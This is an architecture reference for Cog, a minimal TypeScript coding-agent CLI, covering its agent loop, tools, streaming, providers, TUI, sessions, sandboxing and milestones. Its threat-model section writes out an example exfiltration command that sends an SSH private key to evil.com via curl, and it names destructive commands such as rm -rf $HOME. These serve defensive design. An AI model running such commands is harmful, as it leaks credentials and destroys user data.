# Cog — Architecture Reference

This is the canonical reference for how Cog is structured. It is **not** an
implementation guide — it explains the moving parts, the tradeoffs, and where
to read deeper before touching any one piece.

The supporting reference docs (read these before implementing the matching
section):

- [`pi-reference.md`](./pi-reference.md) — full breakdown of the `pi` coding
  agent (the cleanest minimal reference we have).
- [`opencode-reference.md`](./opencode-reference.md) — full breakdown of
  `opencode`, including its session model and its (explicit) lack of
  sandboxing.
- [`just-bash-reference.md`](./just-bash-reference.md) — full breakdown of
  the `just-bash` TS bash interpreter we may embed.
- [`industry-references.md`](./industry-references.md) — survey of 20+
  canonical articles + a synthesized patterns section.

---

## 0. Design constraints (non-negotiable)

1. **Minimal dependencies.** Every dep added is a dep we have to audit,
   update, and understand. Build from scratch unless the dep is
   load-bearing (model SDK, a sandbox).
2. **From-scratch where it's instructive.** TUI, agent loop, tool dispatch,
   streaming parser — these are the *point* of the project. Don't pull in
   `ink` / `bubble-tea` / `langchain` / `ai`.
3. **Cheap models first.** Start on Haiku 4.5 / Gemini 2.5 Flash / GPT-5
   mini. Only graduate to Sonnet 4.6 / Opus 4.7 once the loop is stable
   enough that we can tell a model failure from a harness failure.
4. **Security is a first-class section, not an afterthought.** A coding
   agent that can `rm -rf /` because the model hallucinated is not
   acceptable.
5. **Single-process by default.** No microservices, no client/server split
   until we have a concrete reason. Cog runs as one Node process.

---

## 1. The big pieces

A coding agent decomposes into seven pieces. Each section below has:
- **What it does** (one paragraph).
- **Canonical pattern** (drawn from the references).
- **What Cog will do**.
- **Where to read more** (link into the reference docs).

```
┌──────────────────────────────────────────────────────────────────┐
│                              TUI                                 │
│              (input box, transcript, status line)                │
└────────────┬─────────────────────────────────────────────────────┘
             │  user messages / interrupts
             ▼
┌──────────────────────────────────────────────────────────────────┐
│                          AGENT LOOP                              │
│   while (!stop)                                                  │
│     stream = model.send(messages, tools)                         │
│     emit text deltas to TUI                                      │
│     run tool_use blocks → tool_result blocks                     │
│     append assistant + tool_result to messages                   │
│     if no tool_use → stop                                        │
└──┬────────────────────────┬───────────────────────────┬──────────┘
   │                        │                           │
   ▼                        ▼                           ▼
┌──────────────┐   ┌───────────────────┐    ┌──────────────────────┐
│  Provider    │   │  Tool registry    │    │   Session store      │
│  (model API) │   │  - read           │    │   JSONL append-only  │
│  + streaming │   │  - write          │    │   resumable          │
│              │   │  - edit           │    │                      │
│              │   │  - bash           │    └──────────────────────┘
│              │   │  - grep / glob    │
│              │   │  - todo           │
│              │   │  - task (subagent)│
│              │   └─────────┬─────────┘
│              │             │
│              │             ▼
│              │   ┌───────────────────┐
│              │   │   Sandbox layer   │
│              │   │   (bash + FS)     │
│              │   └───────────────────┘
└──────────────┘
```

---

## 2. The agent loop

**What it does.** Drives one turn of the conversation. It sends the
current message list + tool catalogue to the model, streams the response,
dispatches any tool calls, appends results, and decides whether to loop
again. Everything else in the project exists to feed or be consumed by
this loop.

**Canonical pattern.** Across pi, opencode, smolagents, Strands, Claude
Code and Codex CLI it is the same ~10-line shape:

```
loop:
  stream = provider.send(messages, tools)
  for delta in stream:
    if delta.text: emit_to_ui(delta.text)
    if delta.tool_call: collect(delta.tool_call)
  append assistant_message to messages
  if no tool_calls: break
  for call in tool_calls:
    result = tools[call.name](call.input)
    append tool_result(call.id, result) to messages
```

The variations that matter:
- **Streaming model.** Anthropic and OpenAI both emit incremental
  `content_block_delta` events. The loop must accumulate them into
  whole tool-use blocks before dispatching.
- **Parallel vs serial tool execution.** pi runs read-only tools in
  parallel, writes serially (see `pi-reference.md §3`). Claude Code
  defaults serial. Start serial in Cog — parallelism is a later
  optimization.
- **Termination.** No tool calls = stop. Optional: `max_steps`,
  user-interrupt, `compact` trigger.
- **Compaction.** When the context window crosses a threshold,
  summarize old turns. See `industry-references.md §5` and
  `opencode-reference.md §3` for the standard "summarize-N-oldest"
  recipe.

**What Cog will do.**
- Single file, single function: `runLoop(session, message)`.
- No state machine, no event bus. Just `while (true)`.
- Serial tool dispatch in v1. Parallelism behind a flag later.
- Bail out conditions: no tool calls, max steps reached, user
  interrupt (`SIGINT`), or compaction needed.

**Read more.** `pi-reference.md §2`, `opencode-reference.md §3`,
`industry-references.md` Patterns Synthesis.

---

## 3. Tools

**What it does.** A tool is a typed function the model can call. The
registry is just a `Map<name, {schema, run}>`. Tools are how the agent
*does* anything beyond producing text.

**Canonical catalogue.** Every coding agent in the survey ships some
subset of:

| Tool          | Purpose                                          | v1? |
|---------------|--------------------------------------------------|-----|
| `read`        | Read a file with line numbers                    | yes |
| `write`       | Create / overwrite a file                        | yes |
| `edit`        | Targeted string replace (preferred over `write`) | yes |
| `bash`        | Run a shell command                              | yes |
| `grep`        | ripgrep wrapper                                  | yes |
| `glob`        | File-name pattern search                         | yes |
| `ls`          | Directory listing                                | maybe |
| `todo`        | Model-managed task list (huge for long tasks)    | yes |
| `task`        | Spawn a subagent for a focused subtask           | later |
| `web_fetch`   | Pull a URL                                       | later |
| `web_search`  | Search the web                                   | later |

**Schema.** Anthropic and OpenAI both speak JSON Schema. Define each
tool once with a Zod-or-equivalent schema and adapt it to whatever the
provider expects. Keep tool *descriptions* short, declarative, with one
"when to use this" sentence — see Anthropic's "Writing Tools for
Agents" guide.

**Tool result contract.** Always stringly typed. Truncate large
outputs. Always return a useful error on failure ("file not found:
/path") — the model needs the error to recover.

**What Cog will do.**
- Tools live in their own module/package. Each is one file.
- Registry is a plain object, not a class hierarchy.
- Schema lives next to the tool. No separate manifest file.
- Outputs are capped (~25k chars). Bash output is streamed back to
  the model only after the command finishes (no live pipe to the
  model).

**Read more.** `pi-reference.md §3`, `opencode-reference.md §4`,
`industry-references.md §2` (Writing Tools for Agents).

---

## 4. Streaming

**What it does.** Model output arrives as a stream of SSE events. The
agent must (a) render text incrementally in the TUI, (b) accumulate
tool-use blocks until they are complete, (c) survive partial JSON,
backpressure, and disconnects.

**Canonical pattern.** Each provider has its own SSE event vocabulary;
the loop normalizes them into a small internal event union:

```
type StreamEvent =
  | { type: "text",      delta: string }
  | { type: "tool_use",  id, name, input } // emitted whole, after assembly
  | { type: "stop",      reason }
  | { type: "error",     err }
```

Critical insight from `pi-reference.md §4`: **failures should be pushed
into the event stream as events, not thrown.** That way the loop stays
linear and the TUI can render the error like any other event.

**What Cog will do.**
- Use the official Anthropic/OpenAI SDKs *only* for SSE parsing —
  these are the parts where rolling our own is real risk and zero
  learning. (Open question: is it worth writing the SSE parser from
  scratch? It's <100 lines. Decision deferred.)
- A `Stream<StreamEvent>` async iterator is the only thing the agent
  loop sees. Provider details are hidden behind it.

**Read more.** `pi-reference.md §4`, `opencode-reference.md §6`.

---

## 5. Model providers (cheap → expensive)

**What it does.** Translates the internal `messages + tools` shape
into the wire format each provider expects, and translates the SSE
stream back.

**Canonical pattern.** `pi-ai` (see `pi-reference.md §6`) keys its
registry on **API shape** (OpenAI-compatible, Anthropic, Google), not on
provider name — so OpenRouter, DeepInfra, vLLM, Groq, etc. all share
one implementation. That's the right factoring.

**Models, May 2026 (from `industry-references.md §20`):**

| Tier        | Use for                          | Default model              |
|-------------|----------------------------------|----------------------------|
| Cheap/fast  | Tool-call routing, edit drafts   | Haiku 4.5 / GPT-5 mini     |
| Mid         | Day-to-day coding                | Sonnet 4.6 / GPT-5         |
| Frontier    | Architecture, hard debugging     | Opus 4.7 / GPT-5.5         |
| Open-weight | Local / cheap                    | Qwen3-Coder-Next / GLM-4.7 |

**Start with Haiku 4.5.** It is cheap enough to fail loudly without
budget anxiety, and capable enough that a working loop will produce
visibly working coding behavior.

**What Cog will do.**
- One `Provider` interface: `stream(messages, tools, model) → AsyncIterable<StreamEvent>`.
- Implement Anthropic first. OpenAI-compatible second (covers OpenAI
  + every OpenAI-shaped relay).
- Prompt caching turned on for Anthropic from day one — see
  `industry-references.md §6`. The cache breakpoints are: system prompt,
  tool definitions, conversation prefix. Without caching this gets
  expensive fast.

**Read more.** `pi-reference.md §6`, `industry-references.md §20`,
`industry-references.md §6` (Prompt Caching).

---

## 6. TUI

**What it does.** Reads keystrokes, renders the transcript, shows
spinners while the model is thinking, handles Ctrl-C interrupts, and
gets out of the way.

**Canonical patterns:**
- **Differential renderer (pi).** Render a frame as `string[]` (one
  line per row); diff against last frame; only repaint changed rows.
  See `pi-reference.md §7` — about 2 runtime deps total.
- **SolidJS + opentui (opencode).** Reactive UI components. Heavier
  but more flexible. See `opencode-reference.md §5`.
- **Bubble Tea (Claude Code, gemini-cli).** Go binary, IPC to the
  agent. Heaviest. We will not do this.

**What Cog will do.**
- Differential renderer modeled on `pi-tui`. ~500 LOC target.
- ANSI escape codes by hand (or via `picocolors` — tiny, no deps).
- Raw-mode keyboard via `process.stdin.setRawMode(true)` — no
  readline, no inquirer.
- Components: input line, transcript, status line, modal (for
  permission prompts). Nothing else.

**Read more.** `pi-reference.md §7` (this is the model we're
copying), `opencode-reference.md §5` (what we're explicitly not
doing).

---

## 7. Session state

**What it does.** Conversation history. Tool results. Resumable so
you can pick up a session tomorrow.

**Canonical pattern.** Append-only JSONL on disk, one file per
session, in `~/.cog/sessions/{id}.jsonl`. Each line is a typed event
(`user_message`, `assistant_message`, `tool_use`, `tool_result`).
Replaying the file rebuilds the message list.

pi takes this one step further: sessions are tree-shaped so you can
fork and replay (see `pi-reference.md §5`). Start with linear in v1.

**Compaction.** When the input token count crosses ~80% of the
window:
1. Summarize the oldest N turns into a single synthetic
   "summary" message.
2. Keep the last K turns verbatim.
3. Always keep the original user goal.

This is the **single most important** context-engineering practice
(see `industry-references.md §3` and `§5`). Without it, long
sessions run out of context and the model loses the plot.

**What Cog will do.**
- Linear JSONL session log in v1.
- Compaction trigger at ~80% of window, summarize-oldest strategy.
- No branching/forking in v1. Add later if needed.

**Read more.** `pi-reference.md §5`, `opencode-reference.md §3`,
`industry-references.md §3`.

---

## 8. Sandboxing / security

This is the section we will get most wrong if we don't read carefully.
**Opencode explicitly does not sandbox** (see
`opencode-reference.md §7` and its `SECURITY.md`). Their permission
system is a UX prompt, not isolation. Anthropic Claude Code uses
OS-level sandboxes (macOS `sandbox-exec`, Linux `bwrap`).

**The threat surfaces of a coding agent:**
1. **Bash tool eats the host.** Model hallucinates `rm -rf $HOME`.
2. **Write tool clobbers files outside the project.** Model writes
   to `/etc/passwd`.
3. **Prompt injection from read files.** A file the model reads
   contains adversarial instructions.
4. **Network exfiltration.** Bash runs `curl https://evil.com -d @~/.ssh/id_rsa`.
5. **Long-running runaway compute.** Model spawns infinite loop.

**Layered defenses we will adopt (defense in depth):**

| Layer | Tool                                | What it stops                              |
|-------|-------------------------------------|--------------------------------------------|
| 1     | Workspace root jail (path resolution) | Writes outside cwd                       |
| 2     | Permission prompt (allow-once / always) | Surprising commands                    |
| 3     | OS sandbox (sandbox-exec / bwrap)   | Bash escaping the workspace                |
| 4     | Network deny-by-default             | Exfil, supply chain                        |
| 5     | Timeout + output cap                | Runaway compute                            |

**The `just-bash` question.** `just-bash-reference.md §11` is
explicit: embed it for "inspect-and-munge" bash (grep/sed/awk over
project files), pair with bwrap/sandbox-exec/Vercel Sandbox for
anything that needs real binaries. Don't fork it.

**What Cog will do (v1 → v2 progression):**
- **v1 (development):** Path jail + permission prompt. Sandbox skipped
  while we're iterating in a trusted env. Document this loudly in the
  README so nobody runs Cog on untrusted prompts.
- **v2:** OS sandbox layer — `sandbox-exec` on macOS, `bwrap` on Linux.
  Network deny by default.
- **v3 (if needed):** Embed `just-bash` for the high-frequency read-only
  bash calls, leaving the OS sandbox only for "real" commands.

**Read more.** `just-bash-reference.md` (whole doc),
`industry-references.md §4` (Claude Code Sandboxing), and the
existing `THREAT_MODEL.md` from just-bash for a template.

---

## 9. Repo layout

We will use **pnpm workspaces** with a few small packages. This
matches the references and keeps the inner loop fast.

```
cog/
├── package.json                  # workspace root, scripts, tooling
├── pnpm-workspace.yaml
├── biome.json                    # lint + format
├── tsconfig.base.json
├── docs/                         # ← this folder
└── packages/
    ├── cog/                      # the CLI entry point (`cog` binary)
    ├── agent/                    # the agent loop + session + tool registry
    ├── tools/                    # built-in tools (read/write/edit/bash/...)
    ├── providers/                # anthropic, openai, … (LLM clients)
    └── tui/                      # differential renderer + components
```

**Why packages and not a single src/?**
- It mirrors the reference projects.
- It enforces clean seams: `tui` cannot import from `providers`, etc.
- It makes the dependency graph legible and lets us audit the
  dep-footprint per layer.

**Tooling baseline (root):**
- TypeScript via `tsc` (stock compiler). `tsgo` parked until it's stable.
- Biome for lint + format. *Not* ESLint — Biome is one tool, fast,
  matches both reference repos.
- Vitest deferred — testing comes after a working loop, per TODO.md.

**Read more.** `pi-reference.md §1`, `opencode-reference.md §1`.

---

## 10. Milestones

A logical, incremental build order so each step produces something
runnable.

### M0 — Repo scaffolding (no agent yet)
- pnpm workspace, biome, tsc, root scripts (`lint`, `typecheck`,
  `build`).
- Empty `cog` CLI that prints a banner and exits.
- `CLAUDE.md` at root telling Claude to coach, not code.

### M1 — Single-turn echo (no streaming, no tools)
- `providers/anthropic`: send a message, get a non-streaming reply.
- **Hard-code the model to `claude-haiku-4-5`** (fast + super cheap; per the
  cheap-models-first principle in §0). Don't add a model picker yet —
  iterate the harness on the cheapest model that's smart enough to call
  tools.
- `cog` CLI: read one prompt from stdin, print the response.
- Wire `ANTHROPIC_API_KEY` from env.

### M2 — Streaming
- Switch provider to streaming. Pipe text deltas straight to stdout.
- Internal `StreamEvent` shape established.

### M3 — Bare TUI
- Differential renderer running.
- Raw-mode keyboard input.
- Input line + scrolling transcript.
- Still no tools.

### M4 — Read-only tools + loop
- Tool registry skeleton.
- `read`, `ls`, `grep`, `glob`.
- Agent loop assembles tool_use blocks and dispatches.
- Permission prompt before each tool run.

### M5 — Write tools (gated)
- `write`, `edit`, `bash`.
- Path jail (writes confined to cwd).
- Auto-allow read-only tools, prompt for writes/bash.

### M6 — Session persistence + resume
- JSONL append-only session log.
- `cog --resume <id>`.

### M7 — Context compaction
- Token counting.
- Summarize-oldest at ~80% window.

### M8 — Second provider + cheap-first defaults
- OpenAI-compatible provider.
- Model picker + default routing (Haiku 4.5 cheap, Sonnet 4.6 mid).

### M9 — Sandboxing
- `sandbox-exec` (macOS) / `bwrap` (Linux) for `bash`.
- Network deny by default.

### M10 — Polish
- Prompt caching breakpoints.
- `todo` tool.
- Per-tool output caps and timeouts.

Tests come in *after* M4 — there's not much worth testing until the
loop exists. From M5 onward, write tests as we add tools.

---

## 11. Open questions

These are unresolved and worth a conscious choice before they
ossify into accidental decisions:

1. **Roll our own SSE parser, or lean on the provider SDKs?** The
   from-scratch ethos says yes; the dependency-minimization ethos
   says the SDK ships one anyway. Decision deferred to M2.
2. **Bun or Node?** Both reference projects use Bun (opencode) or
   plain Node (pi). Bun = faster startup, builtin TS, but younger
   ecosystem. Decision deferred to M0; default = Node + tsc (tsgo parked).
3. **Subagent (`task`) tool in v1?** Cognition's "Don't build
   multi-agents" essay (see `industry-references.md §7`) argues
   strongly against. Default = skip until M10+.
4. **Differential renderer scope.** Do we re-render the full frame
   each tick, or maintain a real virtual-DOM-like tree? Re-render is
   simpler and matches pi. Default = full re-render.
5. **One CLI or a daemon + CLI?** Opencode runs a server and the TUI
   attaches. Pi is one process. We will be one process unless and
   until we need multi-client.

---

## 12. What this doc is not

- Not an implementation guide. The reference docs in this folder
  cover *how* the reference projects do each piece. This doc is the
  *what* and *why* for Cog.
- Not a final design. M0–M10 will reveal things we're wrong about.
  Update this doc when that happens — don't let it drift.
- Not a spec. There are no acceptance criteria here. Each milestone
  is "demo it works on the happy path, then move on."
